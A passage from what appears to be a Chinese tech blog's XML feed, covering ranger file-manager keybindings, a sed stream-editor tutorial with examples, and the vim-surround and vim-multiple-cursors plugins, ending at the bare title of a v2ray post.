<td><code>pl</code></td>
<td>粘贴为符号链接，不在状态栏显示条目的相对路径</td>
</tr>
<tr>
<td><code>pl</code></td>
<td>粘贴为符号路径(相对路径) ，在状态栏显示条目的相对路径</td>
</tr>
<tr>
<td><code>phl</code></td>
<td>粘贴为硬链接</td>
</tr>
<tr>
<td><code>pht</code></td>
<td>粘贴为硬链接的子目录</td>
</tr>
</tbody>
</table>
</div>
<h3 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;a/u/g/o&gt;+&lt;r/w/x/1~7&gt;</code></td>
<td>增加权限</td>
</tr>
<tr>
<td><code>&lt;a/u/g/o&gt;-&lt;r/w/x/1~7&gt;</code></td>
<td>取消权限</td>
</tr>
<tr>
<td><code>&lt;a/u/g/o&gt;-&lt;r/w/x/1~7&gt;</code></td>
<td>指定权限</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><code>a</code> ALL</li>
<li><code>u</code> 所有者</li>
<li><code>g</code> 所属组</li>
<li><code>o</code> 其他</li>
<li><code>r(1)</code> 读</li>
<li><code>w(2)</code> 写</li>
<li><code>x(4)</code> 执行</li>
</ul>
<h3 id="运行文件"><a href="#运行文件" class="headerlink" title="运行文件"></a>运行文件</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>l</code> 或 <code>&lt;ENTER&gt;</code></td>
<td>用默认程序打开文件，<code>ranger</code> 不知道文件的打开程序时，会提示 <code>:open_with</code>  用于指定程序</td>
</tr>
<tr>
<td><code>r</code></td>
<td>指定程序打开文件同 <code>:open_with</code> 命令</td>
</tr>
<tr>
<td><code>S</code></td>
<td>在当前目录下打开<code>shell</code></td>
</tr>
</tbody>
</table>
</div>
<h5 id="open-with"><a href="#open-with" class="headerlink" title=":open_with"></a><code>:open_with</code></h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">:open_with &lt;程序&gt; &lt;模式&gt; &lt;选项&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;程序&gt;</code> 指定程序，<code>~/.config/ranger/apps.py</code> 里面的定义了相应程序打开相应的文件，若没有该文件实用命令 <code>ranger --copy-config apps</code>生成,<code>CustomApplications</code> 中每一个以 <code>app_</code> 开头的函数会被命令 <code>:open_with</code>  用到。</li>
<li><code>&lt;模式&gt;</code> <code>0</code> 窗口模式 ， <code>1</code>全屏模式</li>
<li><p><code>&lt;选项&gt;</code> 指定方式调用程序</p>
<ul>
<li><code>s</code> 静默模式，任何输出将被丢弃</li>
<li><code>d</code> 分离程序（在后台运行）</li>
<li><code>p</code> 将输入重定向到 pager</li>
<li><code>w</code> 当程序执行完成时需要用户回车确认</li>
</ul>
<p>大写  <code>&lt;选项&gt;</code>  有相反的作用，如一程序默认就在后台运行，那么可以使用 <code>:open_with D</code> 来防止其在后台运行</p>
</li>
</ul>
<h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>t</code></td>
<td>标记/取消标记条目,标记后光标下移，默认 <code>*</code></td>
</tr>
<tr>
<td><code>ut</code></td>
<td>取消标记</td>
</tr>
<tr>
<td><code>&quot;</code> + <code>任意字符</code></td>
<td>使用 <code>任意字符</code> 标记/取消标记</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索排序"><a href="#搜索排序" class="headerlink" title="搜索排序"></a>搜索排序</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/</code></td>
<td>打开搜索框，输入搜索内容后回车开始搜索,同 <code>:search</code></td>
</tr>
<tr>
<td><code>f</code></td>
<td>向下查找并打开目标,同 <code>:find</code></td>
</tr>
<tr>
<td><code>zf</code></td>
<td>过滤器,显示符合条件的条目，区分大小写，<code>^r</code> 取消过滤</td>
</tr>
<tr>
<td><code>n</code> 、<code>N</code></td>
<td>查找下、上一个搜索结果</td>
</tr>
<tr>
<td><code>c</code> + <code>对应字母</code> 根据属性遍历</td>
<td><code>a</code> 最后访问时间 (atime) <br><code>c</code>状态(权限属性等)变更时间(ctime) <br><code>m</code> 最后修改内容时间(mtime) <br><code>i</code> MIME类型(mimetype) <br><code>s</code> 文件大小(size) <br><code>t</code> 标签(tag)</td>
</tr>
<tr>
<td><code>o</code>+<code>对应字母</code> 根据属性排序(小写字母正向，大写字母反向)</td>
<td><code>a/A</code> 最后访问时间 (atime) <br><code>b/B</code> 文件名(basename)<br><code>c/C</code>状态(权限属性等)变更时间(ctime) <br><code>e/E</code> 扩展名(extension) <br><code>m/M</code> 最后修改内容时间(mtime) <br><code>n/N</code> 自然排序(A1<A2<A10)(natural) <br><code>s/S</code> 文件大小(size) <br><code>t/T</code> 文件类型(type) <br><code>r</code> 反向(Ranger 默认升序)</A2<A10)(natural)></td>
</tr>
</tbody>
</table>
</div>
<h3 id="书签、标签页"><a href="#书签、标签页" class="headerlink" title="书签、标签页"></a>书签、标签页</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>m</code>,<code>\``,</code>‘`</td>
<td>显示书签</td>
</tr>
<tr>
<td><code>m</code> + <code>任意字符</code></td>
<td>新建书签</td>
</tr>
<tr>
<td><code>\`` 或</code>‘<code>+</code>任意字符`</td>
<td>打开书签</td>
</tr>
<tr>
<td><code>um</code> + <code>任意字符</code></td>
<td>删除书签</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gn</code> 或 <code>^n</code></td>
<td>新建标签</td>
</tr>
<tr>
<td><code>gt</code> 或 <code>&lt;TAB&gt;</code> 或 <code>^i</code></td>
<td>下一标签</td>
</tr>
<tr>
<td><code>gT</code> 或 <code>&lt;Shift-TAB&gt;</code></td>
<td>上一标签</td>
</tr>
<tr>
<td><code>&lt;Alt-n&gt;</code></td>
<td>打开指定标签，<code>n</code>为 <code>1~9</code> 的标签号，若标签不存在则新建</td>
</tr>
<tr>
<td><code>&lt;Alt-Right&gt;</code> / <code>&lt;Alt-Left&gt;</code></td>
<td>切换标签</td>
</tr>
</tbody>
</table>
</div>
<h3 id="显示模式"><a href="#显示模式" class="headerlink" title="显示模式"></a>显示模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Mf</code></td>
<td><code>filename</code> 模式 (文件名+文件大小，文件夹显示文件数)</td>
</tr>
<tr>
<td><code>Mi</code></td>
<td><code>fileinfo</code> 模式 (文件名，媒体文件显示更多信息，文件夹显示文件数)</td>
</tr>
<tr>
<td><code>Mm</code></td>
<td><code>mtime</code> 模式 (文件名+最后修改时间)</td>
</tr>
<tr>
<td><code>Mp</code></td>
<td><code>permissions</code> 模式 (权限信息+文件名)</td>
</tr>
<tr>
<td><code>Ms</code></td>
<td><code>sizemitime</code> 模式 (文件名+ 文件大小+最后修改时间，文件夹显示文件数)</td>
</tr>
<tr>
<td><code>Mt</code></td>
<td><code>metatitle</code> 模式 (文件名 + 文件大小，文件夹显示文件数)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>w</code></td>
<td>打开/关闭任务视图</td>
</tr>
<tr>
<td><code>dd</code></td>
<td>终止一个任务</td>
</tr>
<tr>
<td><code>J</code></td>
<td>降低当前任务的优先级</td>
</tr>
<tr>
<td><code>K</code></td>
<td>提升当前任务的优先级</td>
</tr>
</tbody>
</table>
</div>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>!/s</code></td>
<td>使用 <code>shell</code> 命令(<code>！shell -w ls -hl %s</code>,<code>%s</code>代表当前被选中的文件)</td>
</tr>
<tr>
<td><code>:</code></td>
<td>使用 Ranger 的命令</td>
</tr>
<tr>
<td><code>u</code></td>
<td>撤销操作</td>
</tr>
<tr>
<td><code>W</code></td>
<td>打开消息日志</td>
</tr>
<tr>
<td><code>du</code></td>
<td>显示当前目录的磁盘占用情况</td>
</tr>
<tr>
<td><code>dU</code></td>
<td>显示当前目录的磁盘占用情况(按大小排序)</td>
</tr>
<tr>
<td><code>R</code></td>
<td>刷新当前目录</td>
</tr>
<tr>
<td><code>^r</code></td>
<td>清空缓存并刷新目录</td>
</tr>
<tr>
<td><code>^l</code></td>
<td>重画当前窗口</td>
</tr>
<tr>
<td><code>~</code></td>
<td>切换界面风格</td>
</tr>
<tr>
<td><code>ESC</code></td>
<td>退出到正常模式</td>
</tr>
<tr>
<td><code>q/Q/ZQ/ZZ</code></td>
<td>退出 Ranger</td>
</tr>
</tbody>
</table>
</div>
<p>和 vim 一样，指令之前可以指定一个数字，表示执行多少次指令</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>5^D</code></td>
<td>向下翻5个半页</td>
</tr>
<tr>
<td><code>3h</code></td>
<td>向上跳3级目录</td>
</tr>
<tr>
<td><code>6gg</code> 或 <code>6G</code></td>
<td>跳第6行</td>
</tr>
<tr>
<td><code>20%</code></td>
<td>跳到当前页的 <code>20%</code> 处</td>
</tr>
</tbody>
</table>
</div>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>:</code></td>
<td>开头，可用 <code>&lt;TAB&gt;</code> 补全</td>
</tr>
</tbody>
</table>
</div>
<p>所有命令都在<code>~/.config/ranger/commands.py</code>中</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>:cd &lt;dirname&gt;</code></td>
<td>跳转到目录 <dirname></dirname></td>
</tr>
<tr>
<td><code>:chmod &lt;octal_number&gt;</code></td>
<td>设置被选项的权限</td>
</tr>
<tr>
<td><code>:delete</code></td>
<td>删除被选项</td>
</tr>
<tr>
<td><code>:edit &lt;filename&gt;</code></td>
<td>编辑文件</td>
</tr>
<tr>
<td><code>:filter &lt;string&gt;</code></td>
<td>只显示文件名中含有给定字符串 <string> 的文件</string></td>
</tr>
<tr>
<td><code>:find &lt;regexp&gt;</code></td>
<td>查找匹配给定正则表达式的文件，并且执行第一个匹配的文件</td>
</tr>
<tr>
<td><code>:grep &lt;string&gt;</code></td>
<td>在选定的项中查找给定的字符串 <string></string></td>
</tr>
<tr>
<td><code>:mark &lt;regexp&gt;</code></td>
<td>选定匹配正则表达式的所有文件</td>
</tr>
<tr>
<td><code>:unmark &lt;regexp&gt;</code></td>
<td>取消选定匹配正则表达式的所有文件</td>
</tr>
<tr>
<td><code>:mkdir &lt;dirname&gt;</code></td>
<td>创建目录</td>
</tr>
<tr>
<td><code>:open_with &lt;program&lt; &lt;mode&gt; &lt;flags&gt;</code></td>
<td>给定参数打开文件，未给任何参数时，等价于 <code>&lt;Enter&gt;</code></td>
</tr>
<tr>
<td><code>:quit</code></td>
<td>退出</td>
</tr>
<tr>
<td><code>:rename &lt;newname&gt;</code></td>
<td>重命名当前文件</td>
</tr>
<tr>
<td><code>:search &lt;regexp&gt;</code></td>
<td>搜索所有匹配正则表达式 <regexp> 的文件,快捷键：<code>/</code></regexp></td>
</tr>
<tr>
<td><code>:shell [-&lt;flags&gt;] &lt;command&gt;</code></td>
<td>运行命令 <code>&lt;command&gt;</code></td>
</tr>
<tr>
<td><code>:set colorscheme snow</code></td>
<td>设置颜色模式</td>
</tr>
<tr>
<td><code>:touch &lt;filename&gt;</code></td>
<td>创建文件</td>
</tr>
</tbody>
</table>
</div>
<p>除了<code>:delete</code>,所有的命令可不用写全，前提与输入字母匹配的命令只有一个</p>
<h2 id="快速预览"><a href="#快速预览" class="headerlink" title="快速预览"></a>快速预览</h2><p>修改 <code>~/.config/ranger/scope.sh</code>配置（默认配置就行）并安装以下程序可实现快速预览相关文件</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#推荐</span><br><span class="line">elinks 		#html</span><br><span class="line"><span class="keyword">highlight</span> 	#text/code</span><br><span class="line">img2txt 	#image</span><br><span class="line">atool 		#压缩包</span><br><span class="line">pdftotext 	#pdf</span><br><span class="line">medinfo 	#audio/video</span><br></pre></td></tr></table></figure>
<p><strong><a href="https://github.com/ranger/ranger">官方仓库</a>中列出的程序</strong></p>
<ul>
<li><code>img2txt</code>（基于<code>caca-utils</code>） 用于ASCII图像预览</li>
<li><code>w3mimgdisplay</code>、<code>ueberzug</code>、<code>kitty</code>、<code>terminology</code>、<code>urxvt</code> 用于图像预览</li>
<li><code>convert</code>（基于<code>imagemagick</code>） 自动旋转图像并进行SVG预览</li>
<li><code>ffmpegthumbnailer</code> 用于视频缩略图</li>
<li><code>highlight</code>、<code>pygmentize</code> 用于代码的语法突出显示</li>
<li><code>atool</code>、<code>bsdtar</code>、<code>unrar</code>和/或<code>7z</code> 用于预览压缩包</li>
<li><code>bsdtar</code>、<code>tar</code>、<code>unrar</code>和/或<code>unzip</code> 用于预览压缩包</li>
<li><code>lynx</code>、<code>w3m</code>、<code>elinks</code> 用于预览html页面</li>
<li><code>pdftotext</code>、<code>mutool</code> pdf预览，pdftoppm以图像预览</li>
<li><code>djvutxt</code> 用于文本DjVu预览 <code>ddjvu</code> 以图像预览</li>
<li><code>calibre</code>、<code>epub-thumbnailer</code> 用于电子书的图像预览</li>
<li><code>transmission-show</code> 用于查看BitTorrent信息</li>
<li><code>mediainfo</code>、<code>exiftool</code> 用于查看有关媒体文件的信息</li>
<li><code>odt2txt</code> 为OpenDocument文本文件（odt，ods，odp和sxw）</li>
<li><code>python</code>、<code>jq</code> JSON文件</li>
<li><code>fontimage</code> 用于字体预览</li>
</ul>
<h2 id="查考"><a href="#查考" class="headerlink" title="查考"></a>查考</h2><p><a href="http://www.huangpan.net/posts/ji-ke/2019-08-21-ranger.html#toc-heading-55">Ranger 用法总结</a></p>
<p><a href="https://www.codenong.com/cs105842061/">终端下文件管理器Ranger使用</a></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ranger</tag>
        <tag>终端</tag>
        <tag>文件管理器</tag>
      </tags>
  </entry>
  <entry>
    <title>sed功能强大的流式文本编辑器</title>
    <url>/posts/fef19fcf/</url>
    <content><![CDATA[<h1 id="sed功能强大的流式文本编辑器"><a href="#sed功能强大的流式文本编辑器" class="headerlink" title="sed功能强大的流式文本编辑器"></a>sed功能强大的流式文本编辑器</h1><p>  sed 是一种流编辑器，配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非使用重定向存储输出。sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。<br>  <strong>sed可集合通道符<code>|</code>使用</strong></p>
<h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [options] <span class="string">&#x27;command&#x27;</span> file(s)</span><br><span class="line">sed [options] -f scriptfile file(s)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="选项-options-、参数"><a href="#选项-options-、参数" class="headerlink" title="选项(options)、参数"></a>选项(options)、参数</h2><p>  <strong>选项</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-e&lt;script&gt;或--expression&#x3D;&lt;script&gt;：以选项中的指定的script来处理输入的文本文件；</span><br><span class="line">-f&lt;script文件&gt;或--file&#x3D;&lt;script文件&gt;：以选项中指定的script文件来处理输入的文本文件；</span><br><span class="line">-h或--help：显示帮助；</span><br><span class="line">-n或--quiet或——silent：仅显示script处理后的结果；</span><br><span class="line">-V或--version：显示版本信息。</span><br></pre></td></tr></table></figure>
<p>  <strong>参数</strong>: 指定待处理的文本文件列表。</p>
<h2 id="sed指令"><a href="#sed指令" class="headerlink" title="sed指令"></a>sed指令</h2><p>  <strong>sed命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a\ 		# 在当前行下面插入文本</span><br><span class="line">i\ 		# 在当前行上面插入文本</span><br><span class="line">c\ 		# 把选定的行改为新的文本</span><br><span class="line">d 		# 删除，删除选择的行</span><br><span class="line">D 		# 删除模板块的第一行</span><br><span class="line">s 		# 替换指定字符</span><br><span class="line">h 		# 拷贝模板块的内容到内存中的缓冲区</span><br><span class="line">H 		# 追加模板块的内容到内存中的缓冲区</span><br><span class="line">g 		# 获得内存缓冲区的内容，并替代当前模板块中的文本。</span><br><span class="line">G 		# 获得内存缓冲区的内容，并追加到当前模板块文本的后面</span><br><span class="line">l 		# 列表不能打印字符的清单</span><br><span class="line">n 		# 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令</span><br><span class="line">N 		# 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码</span><br><span class="line">p 		# 打印模板块的行</span><br><span class="line">P 		# (大写) 打印模板块的第一行</span><br><span class="line">q 		# 退出Sed</span><br><span class="line">b lable # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾</span><br><span class="line">r file 	# 从file中读行</span><br><span class="line">t label # if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾</span><br><span class="line">T label # 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾</span><br><span class="line">w file 	# 写并追加模板块到file末尾 </span><br><span class="line">W file 	# 写并追加模板块的第一行到file末尾</span><br><span class="line">! 		# 表示后面的命令对所有没有被选定的行发生作用 </span><br><span class="line">&#x3D; 		# 打印当前行号码 </span><br><span class="line"># 		# 把注释扩展到下一个换行符以前</span><br></pre></td></tr></table></figure>
<p>  <strong>替换标记</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g 		# 表示行内全面替换  </span><br><span class="line">p 		# 表示打印行</span><br><span class="line">w 		# 表示把行写入一个文件</span><br><span class="line">x 		# 表示互换模板块中的文本和缓冲区中的文本</span><br><span class="line">y 		# 表示把一个字符翻译为另外的字符（但是不用于正则表达式）</span><br><span class="line">\1 		# 子串匹配标记</span><br><span class="line">&amp; 		# 已匹配字符串标记</span><br></pre></td></tr></table></figure>
<p>  <strong>sed元字符集</strong>:</p>
<p>  sed使用的正则表达式是括在斜杠线”/”之间的模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ 		# 匹配行开始，如：&#x2F;^sed&#x2F;匹配所有以sed开头的行</span><br><span class="line">$ 		# 匹配行结束，如：&#x2F;sed$&#x2F;匹配所有以sed结尾的行</span><br><span class="line">. 		# 匹配一个非换行符的任意字符，如：&#x2F;s.d&#x2F;匹配s后接一个任意字符，最后是d</span><br><span class="line">* 		# 匹配0个或多个字符，如：&#x2F;*sed&#x2F;匹配所有模板是一个或多个空格后紧跟sed的行</span><br><span class="line">[] 		# 匹配一个指定范围内的字符，如：&#x2F;[ss]ed&#x2F;匹配sed和Sed</span><br><span class="line">[^] 	# 匹配一个不在指定范围内的字符，如：&#x2F;[^A-RT-Z]ed&#x2F;匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行</span><br><span class="line">\(..\) 	# 保存匹配的字符，如：s&#x2F;\(love\)able&#x2F;\1rs，loveable被替换成lovers</span><br><span class="line">&amp; 		# 保存搜索字符用来替换其他字符，如：s&#x2F;love&#x2F; **&amp;** &#x2F;，love这成 **love** </span><br><span class="line">\&lt; 		# 匹配单词的开始，如:&#x2F;\&lt;love&#x2F;匹配包含以love开头的单词的行</span><br><span class="line">\&gt; 		# 匹配单词的结束，如：&#x2F;love\&gt;&#x2F;匹配包含以love结尾的单词的行</span><br><span class="line">x\&#123;m\&#125; 	# 连续m个x，如：&#x2F;0\&#123;5\&#125;&#x2F;匹配包含5个0的行</span><br><span class="line">x\&#123;m,\&#125; # 至少m个x，如：&#x2F;0\&#123;5,\&#125;&#x2F;匹配至少有5个0的行</span><br><span class="line">x\&#123;m,n\&#125; # 至少m个x，但不多于n个，如：&#x2F;0\&#123;5,10\&#125;&#x2F;匹配5~10个0的行</span><br></pre></td></tr></table></figure>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>  <strong>再第5行后添加一行，并输出结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -e 5a\newline file_name</span><br></pre></td></tr></table></figure>
<p>  <strong>删除行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除第2行</span></span><br><span class="line">sed <span class="string">&#x27;2d&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除第2~5行</span></span><br><span class="line">sed <span class="string">&#x27;2,5d&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示行号和内容，同时删除2~5行</span></span><br><span class="line">nl file_name | sed <span class="string">&#x27;2,5d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>行加内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第2行尾加内容</span></span><br><span class="line">sed <span class="string">&#x27;2a test&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2行前加内容</span></span><br><span class="line">sed <span class="string">&#x27;2i test&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2行尾加内容，再换行加内容</span></span><br><span class="line">sed `2a <span class="built_in">test</span> \</span><br><span class="line">test2`</span><br></pre></td></tr></table></figure>
<p>  <strong>替换行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换第2~5行</span></span><br><span class="line">sed `2,5c <span class="built_in">test</span>` file_name</span><br></pre></td></tr></table></figure>
<p>  <strong>显示指定行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示第5~7行</span></span><br><span class="line">nl <span class="built_in">test</span> | sed -n <span class="string">&#x27;5,7p&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>搜索内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索有关键字的行</span></span><br><span class="line">cat file_name | sed <span class="string">&#x27;/test/p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索并删除</span></span><br><span class="line">cat file_name | sed <span class="string">&#x27;/test/p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索并执行指令,执行&#123;&#125;内的内容，每个命令用分号分隔</span></span><br><span class="line">nl file_name  | sed <span class="string">&#x27;/test/&#123;s/bulabula/hehehe/;p;q&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>搜寻并替换</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/要被取代的字串/新的字串/g&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>多点编辑</strong></p>
<p>  一条sed命令，删除第三行到末尾的数据，并把test替换为TEST</p>
<p>  <code>-e</code>表示多点编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl file_name | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/test/TEST/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>更多参考：<br><a href="https://man.linuxde.net/sed">https://man.linuxde.net/sed</a><br><a href="https://zhang.ge/1926.html">https://zhang.ge/1926.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>vim光标插件</title>
    <url>/posts/955b2cca/</url>
    <content><![CDATA[<p><a href="https://github.com/tpope/vim-surround">vim-surround</a><br>方便编辑括号，括号，引号，XML标标签等的插件</p>
<p><a href="https://github.com/terryma/vim-multiple-cursors">vim-multiple-cursors</a><br>多光标操作，方便对词进行操作的插件</p>
<a id="more"></a>
<h1 id="vim-surround"><a href="#vim-surround" class="headerlink" title="vim-surround"></a>vim-surround</h1><h2 id="quot-换-39"><a href="#quot-换-39" class="headerlink" title="&quot;换&#39;"></a><code>&quot;</code>换<code>&#39;</code></h2><p><code>&quot;Hello world!&quot;</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cs&quot;&#39;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>&#39;Hello world!&#39;</code></p>
<h2 id="39-换-lt-q-gt-标签，且会自动封闭标签-lt-q-gt"><a href="#39-换-lt-q-gt-标签，且会自动封闭标签-lt-q-gt" class="headerlink" title="&#39;换&lt;q&gt;标签，且会自动封闭标签&lt;/q&gt;"></a><code>&#39;</code>换<code>&lt;q&gt;</code>标签，且会自动封闭标签<code>&lt;/q&gt;</code></h2><p><code>&#39;Hello world!&#39;</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cs&#39;&lt;q&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>&lt;q&gt;Hello world!&lt;/q&gt;</code></p>
<h2 id="删除-quot"><a href="#删除-quot" class="headerlink" title="删除&quot;"></a>删除<code>&quot;</code></h2><p><code>&quot;Hello world!&quot;</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ds&quot;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>Hello world!</code></p>
<h2 id="选中词后，给词加符号"><a href="#选中词后，给词加符号" class="headerlink" title="选中词后，给词加符号"></a>选中词后，给词加符号</h2><p><code>Hello world!</code> Hello被选中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysiw]</span><br><span class="line"># iw ： i 编辑 w文本对象</span><br></pre></td></tr></table></figure>
<p><code>[Hello] world!</code></p>
<hr>
<h2 id="需要在符号与词间加空格"><a href="#需要在符号与词间加空格" class="headerlink" title="需要在符号与词间加空格"></a>需要在符号与词间加空格</h2><p><code>[Hello] world!</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cs]&#123;</span><br></pre></td></tr></table></figure>
<p>使用<code>cs]&#123;</code>而不是<code>cs]&#125;</code></p>
<hr>
<p><code>&#123; Hello &#125; world!</code></p>
<h2 id="讲整行用-扩起来"><a href="#讲整行用-扩起来" class="headerlink" title="讲整行用)扩起来"></a>讲整行用<code>)</code>扩起来</h2><p><code>&#123; Hello &#125; world!</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yssb</span><br><span class="line">#或</span><br><span class="line">yss)</span><br></pre></td></tr></table></figure>
<hr>
<p><code>(&#123; Hello &#125; world!)</code></p>
<h2 id="恢复修改"><a href="#恢复修改" class="headerlink" title="恢复修改"></a>恢复修改</h2><p><code>(&#123; Hello &#125; world!)</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ds&#123;ds)</span><br></pre></td></tr></table></figure>
<hr>
<p>Hello world!</p>
<h2 id="选中词，加强调"><a href="#选中词，加强调" class="headerlink" title="选中词，加强调"></a>选中词，加强调</h2><p><code>Hello world!</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysiw&lt;em&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>&lt;em&gt;Hello&lt;/em&gt; world!</code></p>
<h2 id="逐行可视模式（V）下对整行进行加-lt-p-gt-标签的操作"><a href="#逐行可视模式（V）下对整行进行加-lt-p-gt-标签的操作" class="headerlink" title="逐行可视模式（V）下对整行进行加&lt;p&gt;标签的操作"></a>逐行可视模式（<code>V</code>）下对整行进行加<code>&lt;p&gt;</code>标签的操作</h2><p><code>&lt;em&gt;Hello&lt;/em&gt; world!</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S&lt;p class&#x3D;&quot;important&quot;&gt;</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;important&quot;&gt;</span><br><span class="line">  &lt;em&gt;Hello&lt;&#x2F;em&gt; world!</span><br><span class="line">&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p><strong>该插件就是用定义的<code>ds</code>、<code>cs</code>、<code>yss</code>来完成操作的</strong></p>
<h1 id="vim-multiple-cursors"><a href="#vim-multiple-cursors" class="headerlink" title="vim-multiple-cursors"></a>vim-multiple-cursors</h1><ul>
<li><code>&lt;C-n&gt;</code> 开启多光标并选择光标下的单词匹配</li>
<li><code>&lt;C-x&gt;</code> 跳过这个到下一匹配</li>
<li><code>&lt;C-p&gt;</code> 选择上一匹配</li>
<li><code>&lt;A-n&gt;</code> 启动multicursor并选择所用项</li>
<li><code>&lt;Esc&gt;</code> 退出多光标</li>
</ul>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray安装使用</title>
